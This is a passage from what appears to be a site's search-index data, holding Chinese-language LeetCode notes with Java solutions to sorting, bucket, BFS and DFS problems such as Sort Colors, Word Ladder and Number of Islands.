public int[] topKFrequent(int[] nums, int k) { Map<Integer, Integer> frequencyForNum = new HashMap<>(); for (int num : nums) { frequencyForNum.put(num, frequencyForNum.getOrDefault(num, 0) + 1); } List<Integer>[] buckets = new ArrayList[nums.length + 1]; for (int key : frequencyForNum.keySet()) { int frequency = frequencyForNum.get(key); if (buckets[frequency] == null) { buckets[frequency] = new ArrayList<>(); } buckets[frequency].add(key); } List<Integer> topK = new ArrayList<>(); for (int i = buckets.length - 1; i >= 0 && topK.size() < k; i--) { if (buckets[i] == null) { continue; } if (buckets[i].size() <= (k - topK.size())) { topK.addAll(buckets[i]); } else { topK.addAll(buckets[i].subList(0, k - topK.size())); } } int[] res = new int[k]; for (int i = 0; i < k; i++) { res[i] = topK.get(i); } return res;
}`},{header:"2. \u6309\u7167\u5B57\u7B26\u51FA\u73B0\u6B21\u6570\u5BF9\u5B57\u7B26\u4E32\u6392\u5E8F",slug:"_2-\u6309\u7167\u5B57\u7B26\u51FA\u73B0\u6B21\u6570\u5BF9\u5B57\u7B26\u4E32\u6392\u5E8F",content:`451. Sort Characters By Frequency (Medium)
Leetcode / \u529B\u6263
Input:
"tree" Output:
"eert" Explanation:
'e' appears twice while 'r' and 't' both appear once.
So 'e' must appear before both 'r' and 't'. Therefore "eetr" is also a valid answer.
public String frequencySort(String s) { Map<Character, Integer> frequencyForNum = new HashMap<>(); for (char c : s.toCharArray()) frequencyForNum.put(c, frequencyForNum.getOrDefault(c, 0) + 1); List<Character>[] frequencyBucket = new ArrayList[s.length() + 1]; for (char c : frequencyForNum.keySet()) { int f = frequencyForNum.get(c); if (frequencyBucket[f] == null) { frequencyBucket[f] = new ArrayList<>(); } frequencyBucket[f].add(c); } StringBuilder str = new StringBuilder(); for (int i = frequencyBucket.length - 1; i >= 0; i--) { if (frequencyBucket[i] == null) { continue; } for (char c : frequencyBucket[i]) { for (int j = 0; j < i; j++) { str.append(c); } } } return str.toString();
}`},{header:"\u8377\u5170\u56FD\u65D7\u95EE\u9898",slug:"\u8377\u5170\u56FD\u65D7\u95EE\u9898",content:`\u8377\u5170\u56FD\u65D7\u5305\u542B\u4E09\u79CD\u989C\u8272\uFF1A\u7EA2\u3001\u767D\u3001\u84DD\u3002
\u6709\u4E09\u79CD\u989C\u8272\u7684\u7403\uFF0C\u7B97\u6CD5\u7684\u76EE\u6807\u662F\u5C06\u8FD9\u4E09\u79CD\u7403\u6309\u989C\u8272\u987A\u5E8F\u6B63\u786E\u5730\u6392\u5217\u3002\u5B83\u5176\u5B9E\u662F\u4E09\u5411\u5207\u5206\u5FEB\u901F\u6392\u5E8F\u7684\u4E00\u79CD\u53D8\u79CD\uFF0C\u5728\u4E09\u5411\u5207\u5206\u5FEB\u901F\u6392\u5E8F\u4E2D\uFF0C\u6BCF\u6B21\u5207\u5206\u90FD\u5C06\u6570\u7EC4\u5206\u6210\u4E09\u4E2A\u533A\u95F4\uFF1A\u5C0F\u4E8E\u5207\u5206\u5143\u7D20\u3001\u7B49\u4E8E\u5207\u5206\u5143\u7D20\u3001\u5927\u4E8E\u5207\u5206\u5143\u7D20\uFF0C\u800C\u8BE5\u7B97\u6CD5\u662F\u5C06\u6570\u7EC4\u5206\u6210\u4E09\u4E2A\u533A\u95F4\uFF1A\u7B49\u4E8E\u7EA2\u8272\u3001\u7B49\u4E8E\u767D\u8272\u3001\u7B49\u4E8E\u84DD\u8272\u3002`},{header:"1. \u6309\u989C\u8272\u8FDB\u884C\u6392\u5E8F",slug:"_1-\u6309\u989C\u8272\u8FDB\u884C\u6392\u5E8F",content:`75. Sort Colors (Medium)
Leetcode / \u529B\u6263
Input: [2,0,2,1,1,0]
Output: [0,0,1,1,2,2]
\u9898\u76EE\u63CF\u8FF0\uFF1A\u53EA\u6709 0/1/2 \u4E09\u79CD\u989C\u8272\u3002
public void sortColors(int[] nums) { int zero = -1, one = 0, two = nums.length; while (one < two) { if (nums[one] == 0) { swap(nums, ++zero, one++); } else if (nums[one] == 2) { swap(nums, --two, one); } else { ++one; } }
} private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%90%9C%E7%B4%A2.html",title:"Leetcode \u9898\u89E3 - \u641C\u7D22",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u641C\u7D22",slug:"leetcode-\u9898\u89E3-\u641C\u7D22",content:`Leetcode \u9898\u89E3 - \u641C\u7D22 BFS 1. \u8BA1\u7B97\u5728\u7F51\u683C\u4E2D\u4ECE\u539F\u70B9\u5230\u7279\u5B9A\u70B9\u7684\u6700\u77ED\u8DEF\u5F84\u957F\u5EA6
2. \u7EC4\u6210\u6574\u6570\u7684\u6700\u5C0F\u5E73\u65B9\u6570\u6570\u91CF
3. \u6700\u77ED\u5355\u8BCD\u8DEF\u5F84 DFS 1. \u67E5\u627E\u6700\u5927\u7684\u8FDE\u901A\u9762\u79EF
2. \u77E9\u9635\u4E2D\u7684\u8FDE\u901A\u5206\u91CF\u6570\u76EE
3. \u597D\u53CB\u5173\u7CFB\u7684\u8FDE\u901A\u5206\u91CF\u6570\u76EE
4. \u586B\u5145\u5C01\u95ED\u533A\u57DF
5. \u80FD\u5230\u8FBE\u7684\u592A\u5E73\u6D0B\u548C\u5927\u897F\u6D0B\u7684\u533A\u57DF Backtracking 1. \u6570\u5B57\u952E\u76D8\u7EC4\u5408
2. IP \u5730\u5740\u5212\u5206
3. \u5728\u77E9\u9635\u4E2D\u5BFB\u627E\u5B57\u7B26\u4E32
4. \u8F93\u51FA\u4E8C\u53C9\u6811\u4E2D\u6240\u6709\u4ECE\u6839\u5230\u53F6\u5B50\u7684\u8DEF\u5F84
5. \u6392\u5217
6. \u542B\u6709\u76F8\u540C\u5143\u7D20\u6C42\u6392\u5217
7. \u7EC4\u5408
8. \u7EC4\u5408\u6C42\u548C
9. \u542B\u6709\u76F8\u540C\u5143\u7D20\u7684\u7EC4\u5408\u6C42\u548C
10. 1-9 \u6570\u5B57\u7684\u7EC4\u5408\u6C42\u548C
11. \u5B50\u96C6
12. \u542B\u6709\u76F8\u540C\u5143\u7D20\u6C42\u5B50\u96C6
13. \u5206\u5272\u5B57\u7B26\u4E32\u4F7F\u5F97\u6BCF\u4E2A\u90E8\u5206\u90FD\u662F\u56DE\u6587\u6570
14. \u6570\u72EC
15. N \u7687\u540E \u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\u548C\u5E7F\u5EA6\u4F18\u5148\u641C\u7D22\u5E7F\u6CDB\u8FD0\u7528\u4E8E\u6811\u548C\u56FE\u4E2D\uFF0C\u4F46\u662F\u5B83\u4EEC\u7684\u5E94\u7528\u8FDC\u8FDC\u4E0D\u6B62\u5982\u6B64\u3002`},{header:"BFS",slug:"bfs",content:`\u5E7F\u5EA6\u4F18\u5148\u641C\u7D22\u4E00\u5C42\u4E00\u5C42\u5730\u8FDB\u884C\u904D\u5386\uFF0C\u6BCF\u5C42\u904D\u5386\u90FD\u662F\u4EE5\u4E0A\u4E00\u5C42\u904D\u5386\u7684\u7ED3\u679C\u4F5C\u4E3A\u8D77\u70B9\uFF0C\u904D\u5386\u4E00\u4E2A\u8DDD\u79BB\u80FD\u8BBF\u95EE\u5230\u7684\u6240\u6709\u8282\u70B9\u3002\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF0C\u904D\u5386\u8FC7\u7684\u8282\u70B9\u4E0D\u80FD\u518D\u6B21\u88AB\u904D\u5386\u3002
\u7B2C\u4E00\u5C42\uFF1A 0 -> {6,2,1,5} \u7B2C\u4E8C\u5C42\uFF1A 6 -> {4}
2 -> {}
1 -> {}
5 -> {3} \u7B2C\u4E09\u5C42\uFF1A 4 -> {}
3 -> {} \u6BCF\u4E00\u5C42\u904D\u5386\u7684\u8282\u70B9\u90FD\u4E0E\u6839\u8282\u70B9\u8DDD\u79BB\u76F8\u540C\u3002\u8BBE di \u8868\u793A\u7B2C i \u4E2A\u8282\u70B9\u4E0E\u6839\u8282\u70B9\u7684\u8DDD\u79BB\uFF0C\u63A8\u5BFC\u51FA\u4E00\u4E2A\u7ED3\u8BBA\uFF1A\u5BF9\u4E8E\u5148\u904D\u5386\u7684\u8282\u70B9 i \u4E0E\u540E\u904D\u5386\u7684\u8282\u70B9 j\uFF0C\u6709 di <= dj\u3002\u5229\u7528\u8FD9\u4E2A\u7ED3\u8BBA\uFF0C\u53EF\u4EE5\u6C42\u89E3\u6700\u77ED\u8DEF\u5F84\u7B49 \u6700\u4F18\u89E3 \u95EE\u9898\uFF1A\u7B2C\u4E00\u6B21\u904D\u5386\u5230\u76EE\u7684\u8282\u70B9\uFF0C\u5176\u6240\u7ECF\u8FC7\u7684\u8DEF\u5F84\u4E3A\u6700\u77ED\u8DEF\u5F84\u3002\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\uFF0C\u4F7F\u7528 BFS \u53EA\u80FD\u6C42\u89E3\u65E0\u6743\u56FE\u7684\u6700\u77ED\u8DEF\u5F84\uFF0C\u65E0\u6743\u56FE\u662F\u6307\u4ECE\u4E00\u4E2A\u8282\u70B9\u5230\u53E6\u4E00\u4E2A\u8282\u70B9\u7684\u4EE3\u4EF7\u90FD\u8BB0\u4E3A 1\u3002
\u5728\u7A0B\u5E8F\u5B9E\u73B0 BFS \u65F6\u9700\u8981\u8003\u8651\u4EE5\u4E0B\u95EE\u9898\uFF1A \u961F\u5217\uFF1A\u7528\u6765\u5B58\u50A8\u6BCF\u4E00\u8F6E\u904D\u5386\u5F97\u5230\u7684\u8282\u70B9\uFF1B
\u6807\u8BB0\uFF1A\u5BF9\u4E8E\u904D\u5386\u8FC7\u7684\u8282\u70B9\uFF0C\u5E94\u8BE5\u5C06\u5B83\u6807\u8BB0\uFF0C\u9632\u6B62\u91CD\u590D\u904D\u5386\u3002`},{header:"1. \u8BA1\u7B97\u5728\u7F51\u683C\u4E2D\u4ECE\u539F\u70B9\u5230\u7279\u5B9A\u70B9\u7684\u6700\u77ED\u8DEF\u5F84\u957F\u5EA6",slug:"_1-\u8BA1\u7B97\u5728\u7F51\u683C\u4E2D\u4ECE\u539F\u70B9\u5230\u7279\u5B9A\u70B9\u7684\u6700\u77ED\u8DEF\u5F84\u957F\u5EA6",content:`1091. Shortest Path in Binary Matrix(Medium)
Leetcode / \u529B\u6263
[[1,1,0,1], [1,0,1,0], [1,1,1,1], [1,0,1,1]]
\u9898\u76EE\u63CF\u8FF0\uFF1A0 \u8868\u793A\u53EF\u4EE5\u7ECF\u8FC7\u67D0\u4E2A\u4F4D\u7F6E\uFF0C\u6C42\u89E3\u4ECE\u5DE6\u4E0A\u89D2\u5230\u53F3\u4E0B\u89D2\u7684\u6700\u77ED\u8DEF\u5F84\u957F\u5EA6\u3002
public int shortestPathBinaryMatrix(int[][] grids) { if (grids == null || grids.length == 0 || grids[0].length == 0) { return -1; } int[][] direction = {{1, -1}, {1, 0}, {1, 1}, {0, -1}, {0, 1}, {-1, -1}, {-1, 0}, {-1, 1}}; int m = grids.length, n = grids[0].length; Queue<Pair<Integer, Integer>> queue = new LinkedList<>(); queue.add(new Pair<>(0, 0)); int pathLength = 0; while (!queue.isEmpty()) { int size = queue.size(); pathLength++; while (size-- > 0) { Pair<Integer, Integer> cur = queue.poll(); int cr = cur.getKey(), cc = cur.getValue(); if (grids[cr][cc] == 1) { continue; } if (cr == m - 1 && cc == n - 1) { return pathLength; } grids[cr][cc] = 1; // \u6807\u8BB0 for (int[] d : direction) { int nr = cr + d[0], nc = cc + d[1]; if (nr < 0 || nr >= m || nc < 0 || nc >= n) { continue; } queue.add(new Pair<>(nr, nc)); } } } return -1; }`},{header:"2. \u7EC4\u6210\u6574\u6570\u7684\u6700\u5C0F\u5E73\u65B9\u6570\u6570\u91CF",slug:"_2-\u7EC4\u6210\u6574\u6570\u7684\u6700\u5C0F\u5E73\u65B9\u6570\u6570\u91CF",content:`279. Perfect Squares (Medium)
Leetcode / \u529B\u6263
For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9.
\u53EF\u4EE5\u5C06\u6BCF\u4E2A\u6574\u6570\u770B\u6210\u56FE\u4E2D\u7684\u4E00\u4E2A\u8282\u70B9\uFF0C\u5982\u679C\u4E24\u4E2A\u6574\u6570\u4E4B\u5DEE\u4E3A\u4E00\u4E2A\u5E73\u65B9\u6570\uFF0C\u90A3\u4E48\u8FD9\u4E24\u4E2A\u6574\u6570\u6240\u5728\u7684\u8282\u70B9\u5C31\u6709\u4E00\u6761\u8FB9\u3002
\u8981\u6C42\u89E3\u6700\u5C0F\u7684\u5E73\u65B9\u6570\u6570\u91CF\uFF0C\u5C31\u662F\u6C42\u89E3\u4ECE\u8282\u70B9 n \u5230\u8282\u70B9 0 \u7684\u6700\u77ED\u8DEF\u5F84\u3002
\u672C\u9898\u4E5F\u53EF\u4EE5\u7528\u52A8\u6001\u89C4\u5212\u6C42\u89E3\uFF0C\u5728\u4E4B\u540E\u52A8\u6001\u89C4\u5212\u90E8\u5206\u4E2D\u4F1A\u518D\u6B21\u51FA\u73B0\u3002
public int numSquares(int n) { List<Integer> squares = generateSquares(n); Queue<Integer> queue = new LinkedList<>(); boolean[] marked = new boolean[n + 1]; queue.add(n); marked[n] = true; int level = 0; while (!queue.isEmpty()) { int size = queue.size(); level++; while (size-- > 0) { int cur = queue.poll(); for (int s : squares) { int next = cur - s; if (next < 0) { break; } if (next == 0) { return level; } if (marked[next]) { continue; } marked[next] = true; queue.add(next); } } } return n;
} /** * \u751F\u6210\u5C0F\u4E8E n \u7684\u5E73\u65B9\u6570\u5E8F\u5217 * @return 1,4,9,... */
private List<Integer> generateSquares(int n) { List<Integer> squares = new ArrayList<>(); int square = 1; int diff = 3; while (square <= n) { squares.add(square); square += diff; diff += 2; } return squares;
}`},{header:"3. \u6700\u77ED\u5355\u8BCD\u8DEF\u5F84",slug:"_3-\u6700\u77ED\u5355\u8BCD\u8DEF\u5F84",content:`127. Word Ladder (Medium)
Leetcode / \u529B\u6263
Input:
beginWord = "hit",
endWord = "cog",
wordList = ["hot","dot","dog","lot","log","cog"] Output: 5 Explanation: As one shortest transformation is "hit" -> "hot" -> "dot" -> "dog" -> "cog",
return its length 5.
Input:
beginWord = "hit"
endWord = "cog"
wordList = ["hot","dot","dog","lot","log"] Output: 0 Explanation: The endWord "cog" is not in wordList, therefore no possible transformation.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u627E\u51FA\u4E00\u6761\u4ECE beginWord \u5230 endWord \u7684\u6700\u77ED\u8DEF\u5F84\uFF0C\u6BCF\u6B21\u79FB\u52A8\u89C4\u5B9A\u4E3A\u6539\u53D8\u4E00\u4E2A\u5B57\u7B26\uFF0C\u5E76\u4E14\u6539\u53D8\u4E4B\u540E\u7684\u5B57\u7B26\u4E32\u5FC5\u987B\u5728 wordList \u4E2D\u3002
public int ladderLength(String beginWord, String endWord, List<String> wordList) { wordList.add(beginWord); int N = wordList.size(); int start = N - 1; int end = 0; while (end < N && !wordList.get(end).equals(endWord)) { end++; } if (end == N) { return 0; } List<Integer>[] graphic = buildGraphic(wordList); return getShortestPath(graphic, start, end);
} private List<Integer>[] buildGraphic(List<String> wordList) { int N = wordList.size(); List<Integer>[] graphic = new List[N]; for (int i = 0; i < N; i++) { graphic[i] = new ArrayList<>(); for (int j = 0; j < N; j++) { if (isConnect(wordList.get(i), wordList.get(j))) { graphic[i].add(j); } } } return graphic;
} private boolean isConnect(String s1, String s2) { int diffCnt = 0; for (int i = 0; i < s1.length() && diffCnt <= 1; i++) { if (s1.charAt(i) != s2.charAt(i)) { diffCnt++; } } return diffCnt == 1;
} private int getShortestPath(List<Integer>[] graphic, int start, int end) { Queue<Integer> queue = new LinkedList<>(); boolean[] marked = new boolean[graphic.length]; queue.add(start); marked[start] = true; int path = 1; while (!queue.isEmpty()) { int size = queue.size(); path++; while (size-- > 0) { int cur = queue.poll(); for (int next : graphic[cur]) { if (next == end) { return path; } if (marked[next]) { continue; } marked[next] = true; queue.add(next); } } } return 0;
}`},{header:"DFS",slug:"dfs",content:`\u5E7F\u5EA6\u4F18\u5148\u641C\u7D22\u4E00\u5C42\u4E00\u5C42\u904D\u5386\uFF0C\u6BCF\u4E00\u5C42\u5F97\u5230\u7684\u6240\u6709\u65B0\u8282\u70B9\uFF0C\u8981\u7528\u961F\u5217\u5B58\u50A8\u8D77\u6765\u4EE5\u5907\u4E0B\u4E00\u5C42\u904D\u5386\u7684\u65F6\u5019\u518D\u904D\u5386\u3002
\u800C\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\u5728\u5F97\u5230\u4E00\u4E2A\u65B0\u8282\u70B9\u65F6\u7ACB\u5373\u5BF9\u65B0\u8282\u70B9\u8FDB\u884C\u904D\u5386\uFF1A\u4ECE\u8282\u70B9 0 \u51FA\u53D1\u5F00\u59CB\u904D\u5386\uFF0C\u5F97\u5230\u5230\u65B0\u8282\u70B9 6 \u65F6\uFF0C\u7ACB\u9A6C\u5BF9\u65B0\u8282\u70B9 6 \u8FDB\u884C\u904D\u5386\uFF0C\u5F97\u5230\u65B0\u8282\u70B9 4\uFF1B\u5982\u6B64\u53CD\u590D\u4EE5\u8FD9\u79CD\u65B9\u5F0F\u904D\u5386\u65B0\u8282\u70B9\uFF0C\u76F4\u5230\u6CA1\u6709\u65B0\u8282\u70B9\u4E86\uFF0C\u6B64\u65F6\u8FD4\u56DE\u3002\u8FD4\u56DE\u5230\u6839\u8282\u70B9 0 \u7684\u60C5\u51B5\u662F\uFF0C\u7EE7\u7EED\u5BF9\u6839\u8282\u70B9 0 \u8FDB\u884C\u904D\u5386\uFF0C\u5F97\u5230\u65B0\u8282\u70B9 2\uFF0C\u7136\u540E\u7EE7\u7EED\u4EE5\u4E0A\u6B65\u9AA4\u3002
\u4ECE\u4E00\u4E2A\u8282\u70B9\u51FA\u53D1\uFF0C\u4F7F\u7528 DFS \u5BF9\u4E00\u4E2A\u56FE\u8FDB\u884C\u904D\u5386\u65F6\uFF0C\u80FD\u591F\u904D\u5386\u5230\u7684\u8282\u70B9\u90FD\u662F\u4ECE\u521D\u59CB\u8282\u70B9\u53EF\u8FBE\u7684\uFF0CDFS \u5E38\u7528\u6765\u6C42\u89E3\u8FD9\u79CD \u53EF\u8FBE\u6027 \u95EE\u9898\u3002
\u5728\u7A0B\u5E8F\u5B9E\u73B0 DFS \u65F6\u9700\u8981\u8003\u8651\u4EE5\u4E0B\u95EE\u9898\uFF1A \u6808\uFF1A\u7528\u6808\u6765\u4FDD\u5B58\u5F53\u524D\u8282\u70B9\u4FE1\u606F\uFF0C\u5F53\u904D\u5386\u65B0\u8282\u70B9\u8FD4\u56DE\u65F6\u80FD\u591F\u7EE7\u7EED\u904D\u5386\u5F53\u524D\u8282\u70B9\u3002\u53EF\u4EE5\u4F7F\u7528\u9012\u5F52\u6808\u3002
\u6807\u8BB0\uFF1A\u548C BFS \u4E00\u6837\u540C\u6837\u9700\u8981\u5BF9\u5DF2\u7ECF\u904D\u5386\u8FC7\u7684\u8282\u70B9\u8FDB\u884C\u6807\u8BB0\u3002`},{header:"1. \u67E5\u627E\u6700\u5927\u7684\u8FDE\u901A\u9762\u79EF",slug:"_1-\u67E5\u627E\u6700\u5927\u7684\u8FDE\u901A\u9762\u79EF",content:`695. Max Area of Island (Medium)
Leetcode / \u529B\u6263
[[0,0,1,0,0,0,0,1,0,0,0,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,1,1,0,1,0,0,0,0,0,0,0,0], [0,1,0,0,1,1,0,0,1,0,1,0,0], [0,1,0,0,1,1,0,0,1,1,1,0,0], [0,0,0,0,0,0,0,0,0,0,1,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,0,0,0,0,0,0,1,1,0,0,0,0]]
private int m, n;
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; public int maxAreaOfIsland(int[][] grid) { if (grid == null || grid.length == 0) { return 0; } m = grid.length; n = grid[0].length; int maxArea = 0; for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { maxArea = Math.max(maxArea, dfs(grid, i, j)); } } return maxArea;
} private int dfs(int[][] grid, int r, int c) { if (r < 0 || r >= m || c < 0 || c >= n || grid[r][c] == 0) { return 0; } grid[r][c] = 0; int area = 1; for (int[] d : direction) { area += dfs(grid, r + d[0], c + d[1]); } return area;
}`},{header:"2. \u77E9\u9635\u4E2D\u7684\u8FDE\u901A\u5206\u91CF\u6570\u76EE",slug:"_2-\u77E9\u9635\u4E2D\u7684\u8FDE\u901A\u5206\u91CF\u6570\u76EE",content:`200. Number of Islands (Medium)
Leetcode / \u529B\u6263
Input:
11000
11000
00100
00011 Output: 3
\u53EF\u4EE5\u5C06\u77E9\u9635\u8868\u793A\u770B\u6210\u4E00\u5F20\u6709\u5411\u56FE\u3002
private int m, n;
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; public int numIslands(char[][] grid) { if (grid == null || grid.length == 0) { return 0; } m = grid.length; n = grid[0].length; int islandsNum = 0; for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (grid[i][j] != '0') { dfs(grid, i, j); islandsNum++; } } } return islandsNum;
} private void dfs(char[][] grid, int i, int j) { if (i < 0 || i >= m || j < 0 || j >= n || grid[i][j] == '0') { return; } grid[i][j] = '0'; for (int[] d : direction) { dfs(grid, i + d[0], j + d[1]); }
}`},{header:"3. \u597D\u53CB\u5173\u7CFB\u7684\u8FDE\u901A\u5206\u91CF\u6570\u76EE",slug:"_3-\u597D\u53CB\u5173\u7CFB\u7684\u8FDE\u901A\u5206\u91CF\u6570\u76EE",content:`547. Friend Circles (Medium)
Leetcode / \u529B\u6263
Input:
[[1,1,0], [1,1,0], [0,0,1]] Output: 2 Explanation:The 0th and 1st students are direct friends, so they are in a friend circle.
The 2nd student himself is in a friend circle. So return 2.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u597D\u53CB\u5173\u7CFB\u53EF\u4EE5\u770B\u6210\u662F\u4E00\u4E2A\u65E0\u5411\u56FE\uFF0C\u4F8B\u5982\u7B2C 0 \u4E2A\u4EBA\u4E0E\u7B2C 1 \u4E2A\u4EBA\u662F\u597D\u53CB\uFF0C\u90A3\u4E48 M[0][1] \u548C M[1][0] \u7684\u503C\u90FD\u4E3A 1\u3002
private int n; public int findCircleNum(int[][] M) { n = M.length; int circleNum = 0; boolean[] hasVisited = new boolean[n]; for (int i = 0; i < n; i++) { if (!hasVisited[i]) { dfs(M, i, hasVisited); circleNum++; } } return circleNum;
} private void dfs(int[][] M, int i, boolean[] hasVisited) { hasVisited[i] = true; for (int k = 0; k < n; k++) { if (M[i][k] == 1 && !hasVisited[k]) { dfs(M, k, hasVisited); } }
}`},{header:"4. \u586B\u5145\u5C01\u95ED\u533A\u57DF",slug:"_4-\u586B\u5145\u5C01\u95ED\u533A\u57DF",content:`130. Surrounded Regions (Medium)
Leetcode / \u529B\u6263
For example,
X X X X
X O O X
X X O X
X O X X After running your function, the board should be:
X X X X
X X X X
X X X X
X O X X
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4F7F\u88AB 'X' \u5305\u56F4\u7684 'O' \u8F6C\u6362\u4E3A 'X'\u3002
\u5148\u586B\u5145\u6700\u5916\u4FA7\uFF0C\u5269\u4E0B\u7684\u5C31\u662F\u91CC\u4FA7\u4E86\u3002
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};
private int m, n; public void solve(char[][] board) { if (board == null || board.length == 0) { return; } m = board.length; n = board[0].length; for (int i = 0; i < m; i++) { dfs(board, i, 0); dfs(board, i, n - 1); } for (int i = 0; i < n; i++) { dfs(board, 0, i); dfs(board, m - 1, i); } for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (board[i][j] == 'T') { board[i][j] = 'O'; } else if (board[i][j] == 'O') { board[i][j] = 'X'; } } }
} private void dfs(char[][] board, int r, int c) { if (r < 0 || r >= m || c < 0 || c >= n || board[r][c] != 'O') { return; } board[r][c] = 'T'; for (int[] d : direction) { dfs(board, r + d[0], c + d[1]); }
}`},{header:"5. \u80FD\u5230\u8FBE\u7684\u592A\u5E73\u6D0B\u548C\u5927\u897F\u6D0B\u7684\u533A\u57DF",slug:"_5-\u80FD\u5230\u8FBE\u7684\u592A\u5E73\u6D0B\u548C\u5927\u897F\u6D0B\u7684\u533A\u57DF",content:`417. Pacific Atlantic Water Flow (Medium)
Leetcode / \u529B\u6263
Given the following 5x5 matrix: Pacific ~ ~ ~ ~ ~ ~ 1 2 2 3 (5) * ~ 3 2 3 (4) (4) * ~ 2 4 (5) 3 1 * ~ (6) (7) 1 4 5 * ~ (5) 1 1 2 4 * * * * * * Atlantic Return:
[[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]] (positions with parentheses in above matrix).
\u5DE6\u8FB9\u548C\u4E0A\u8FB9\u662F\u592A\u5E73\u6D0B\uFF0C\u53F3\u8FB9\u548C\u4E0B\u8FB9\u662F\u5927\u897F\u6D0B\uFF0C\u5185\u90E8\u7684\u6570\u5B57\u4EE3\u8868\u6D77\u62D4\uFF0C\u6D77\u62D4\u9AD8\u7684\u5730\u65B9\u7684\u6C34\u80FD\u591F\u6D41\u5230\u4F4E\u7684\u5730\u65B9\uFF0C\u6C42\u89E3\u6C34\u80FD\u591F\u6D41\u5230\u592A\u5E73\u6D0B\u548C\u5927\u897F\u6D0B\u7684\u6240\u6709\u4F4D\u7F6E\u3002
private int m, n;
private int[][] matrix;
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; public List<List<Integer>> pacificAtlantic(int[][] matrix) { List<List<Integer>> ret = new ArrayList<>(); if (matrix == null || matrix.length == 0) { return ret; } m = matrix.length; n = matrix[0].length; this.matrix = matrix; boolean[][] canReachP = new boolean[m][n]; boolean[][] canReachA = new boolean[m][n]; for (int i = 0; i < m; i++) { dfs(i, 0, canReachP); dfs(i, n - 1, canReachA); } for (int i = 0; i < n; i++) { dfs(0, i, canReachP); dfs(m - 1, i, canReachA); } for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (canReachP[i][j] && canReachA[i][j]) { ret.add(Arrays.asList(i, j)); } } } return ret;
} private void dfs(int r, int c, boolean[][] canReach) { if (canReach[r][c]) { return; } canReach[r][c] = true; for (int[] d : direction) { int nextR = d[0] + r; int nextC = d[1] + c; if (nextR < 0 || nextR >= m || nextC < 0 || nextC >= n || matrix[r][c] > matrix[nextR][nextC]) { continue; } dfs(nextR, nextC, canReach); }
}`},{header:"Backtracking",slug:"backtracking",content:`Backtracking\uFF08\u56DE\u6EAF\uFF09\u5C5E\u4E8E DFS\u3002 \u666E\u901A DFS \u4E3B\u8981\u7528\u5728 \u53EF\u8FBE\u6027\u95EE\u9898 \uFF0C\u8FD9\u79CD\u95EE\u9898\u53EA\u9700\u8981\u6267\u884C\u5230\u7279\u70B9\u7684\u4F4D\u7F6E\u7136\u540E\u8FD4\u56DE\u5373\u53EF\u3002
\u800C Backtracking \u4E3B\u8981\u7528\u4E8E\u6C42\u89E3 \u6392\u5217\u7EC4\u5408 \u95EE\u9898\uFF0C\u4F8B\u5982\u6709 { 'a','b','c' } \u4E09\u4E2A\u5B57\u7B26\uFF0C\u6C42\u89E3\u6240\u6709\u7531\u8FD9\u4E09\u4E2A\u5B57\u7B26\u6392\u5217\u5F97\u5230\u7684\u5B57\u7B26\u4E32\uFF0C\u8FD9\u79CD\u95EE\u9898\u5728\u6267\u884C\u5230\u7279\u5B9A\u7684\u4F4D\u7F6E\u8FD4\u56DE\u4E4B\u540E\u8FD8\u4F1A\u7EE7\u7EED\u6267\u884C\u6C42\u89E3\u8FC7\u7A0B\u3002 \u56E0\u4E3A Backtracking \u4E0D\u662F\u7ACB\u5373\u8FD4\u56DE\uFF0C\u800C\u8981\u7EE7\u7EED\u6C42\u89E3\uFF0C\u56E0\u6B64\u5728\u7A0B\u5E8F\u5B9E\u73B0\u65F6\uFF0C\u9700\u8981\u6CE8\u610F\u5BF9\u5143\u7D20\u7684\u6807\u8BB0\u95EE\u9898\uFF1A \u5728\u8BBF\u95EE\u4E00\u4E2A\u65B0\u5143\u7D20\u8FDB\u5165\u65B0\u7684\u9012\u5F52\u8C03\u7528\u65F6\uFF0C\u9700\u8981\u5C06\u65B0\u5143\u7D20\u6807\u8BB0\u4E3A\u5DF2\u7ECF\u8BBF\u95EE\uFF0C\u8FD9\u6837\u624D\u80FD\u5728\u7EE7\u7EED\u9012\u5F52\u8C03\u7528\u65F6\u4E0D\u7528\u91CD\u590D\u8BBF\u95EE\u8BE5\u5143\u7D20\uFF1B
\u4F46\u662F\u5728\u9012\u5F52\u8FD4\u56DE\u65F6\uFF0C\u9700\u8981\u5C06\u5143\u7D20\u6807\u8BB0\u4E3A\u672A\u8BBF\u95EE\uFF0C\u56E0\u4E3A\u53EA\u9700\u8981\u4FDD\u8BC1\u5728\u4E00\u4E2A\u9012\u5F52\u94FE\u4E2D\u4E0D\u540C\u65F6\u8BBF\u95EE\u4E00\u4E2A\u5143\u7D20\uFF0C\u53EF\u4EE5\u8BBF\u95EE\u5DF2\u7ECF\u8BBF\u95EE\u8FC7\u4F46\u662F\u4E0D\u5728\u5F53\u524D\u9012\u5F52\u94FE\u4E2D\u7684\u5143\u7D20\u3002`},{header:"1. \u6570\u5B57\u952E\u76D8\u7EC4\u5408",slug:"_1-\u6570\u5B57\u952E\u76D8\u7EC4\u5408",content:`17. Letter Combinations of a Phone Number (Medium)
Leetcode / \u529B\u6263 Input:Digit string "23"
